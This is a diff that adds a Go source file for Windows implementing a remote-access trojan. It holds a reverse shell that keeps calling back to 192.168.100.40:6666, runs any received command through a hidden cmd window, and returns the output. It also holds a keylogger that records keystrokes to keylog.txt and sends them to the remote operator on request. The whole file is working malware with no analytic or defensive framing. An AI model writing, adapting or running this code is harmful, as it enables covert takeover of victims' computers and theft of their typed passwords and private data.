@@ -1,0 +1,138 @@
+//go:build windows
+// +build windows
+
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"net"
+	"os"
+	"os/exec"
+	"syscall"
+	"time"
+
+	"github.com/moutend/go-hook/pkg/keyboard"
+	"github.com/moutend/go-hook/pkg/types"
+)
+
+type KeyloggerControl struct {
+	Running  bool
+	StopChan chan bool
+}
+
+var (
+	keyloggerCtrl = &KeyloggerControl{
+		StopChan: make(chan bool, 1),
+	}
+	filename = "keylog.txt"
+)
+
+func main() {
+	go reverse("192.168.100.40:6666")
+	select {}
+}
+
+func reverse(host string) {
+	for {
+		c, err := net.Dial("tcp", host)
+		if err != nil {
+			time.Sleep(30 * time.Second)
+			continue
+		}
+
+		handleConnection(c)
+		c.Close()
+		time.Sleep(30 * time.Second)
+	}
+}
+
+func handleConnection(c net.Conn) {
+	r := bufio.NewReader(c)
+
+	for {
+		order, err := r.ReadString('\n')
+		if err != nil {
+			return
+		}
+
+		order = order[:len(order)-1]
+
+		switch order {
+		case "start_keylogger":
+			if !keyloggerCtrl.Running {
+				go startKeylogger()
+				c.Write([]byte("[+] Keylogger started\n"))
+			} else {
+				c.Write([]byte("[!] Keylogger already running\n"))
+			}
+
+		case "stop_keylogger":
+			if keyloggerCtrl.Running {
+				keyloggerCtrl.StopChan <- true
+				c.Write([]byte("[+] Keylogger stopped\n"))
+			} else {
+				c.Write([]byte("[!] Keylogger not running\n"))
+			}
+
+		case "read_keylog":
+			content, err := os.ReadFile(filename)
+			if err != nil {
+				c.Write([]byte("[-] Error reading keylog: " + err.Error() + "\n"))
+			} else {
+				c.Write([]byte("[+] Keylog content:\n" + string(content) + "\n"))
+			}
+
+		case "status":
+			status := "stopped"
+			if keyloggerCtrl.Running {
+				status = "running"
+			}
+			c.Write([]byte("[+] Keylogger status: " + status + "\n"))
+
+		default:
+
+			cmd := exec.Command("cmd", "/C", order)
+			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			out, _ := cmd.CombinedOutput()
+			c.Write(out)
+		}
+	}
+}
+
+func startKeylogger() {
+	keyloggerCtrl.Running = true
+	defer func() { keyloggerCtrl.Running = false }()
+
+	keyboardChan := make(chan types.KeyboardEvent, 100)
+
+	if err := keyboard.Install(nil, keyboardChan); err != nil {
+		return
+	}
+	defer keyboard.Uninstall()
+
+	for {
+		select {
+		case k := <-keyboardChan:
+			if k.Message == types.WM_KEYDOWN || k.Message == types.WM_SYSKEYDOWN {
+				vkCodeStr := fmt.Sprintf("%v", k.VKCode)
+				if len(vkCodeStr) > 3 && vkCodeStr[:3] == "VK_" {
+					vkCodeStr = vkCodeStr[3:]
+				}
+				SaveToFile(filename, fmt.Sprintf("[%s] %s\n", time.Now().Format("15:04:05"), vkCodeStr))
+			}
+		case <-keyloggerCtrl.StopChan:
+			return
+		}
+	}
+}
+
+func SaveToFile(filename, content string) error {
+	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0777)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+	_, err = file.WriteString(content)
+	return err
+}
